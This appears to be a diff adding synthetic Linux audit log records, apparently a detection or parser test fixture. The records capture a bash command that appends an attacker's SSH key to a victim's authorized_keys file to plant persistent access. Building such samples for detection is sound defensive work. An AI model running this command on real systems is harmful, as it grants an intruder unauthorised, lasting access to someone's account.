@@ -1,0 +1,5 @@
+type=SYSCALL msg=audit(1642283000.777:5301): arch=c000003e syscall=59 success=yes exit=0 a0=7ffddd112233 a1=7ffddd112250 a2=7ffddd112260 a3=0 items=2 ppid=6301 pid=63001 auid=1500 uid=1500 gid=1500 euid=1500 suid=1500 fsuid=1500 egid=1500 sgid=1500 fsgid=1500 tty=pts9 ses=21 comm="bash" exe="/usr/bin/bash" key=(null)
+type=EXECVE msg=audit(1642283000.777:5301): argc=3 a0="bash" a1="-c" a2="echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDattackerkey attacker@evil' >> /home/victim/.ssh/authorized_keys"
+type=CWD msg=audit(1642283000.777:5301): cwd="/home/victim"
+type=PATH msg=audit(1642283000.777:5301): item=0 name="/usr/bin/bash" inode=345678 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0
+type=PROCTITLE msg=audit(1642283000.777:5301): proctitle=62617368002D63
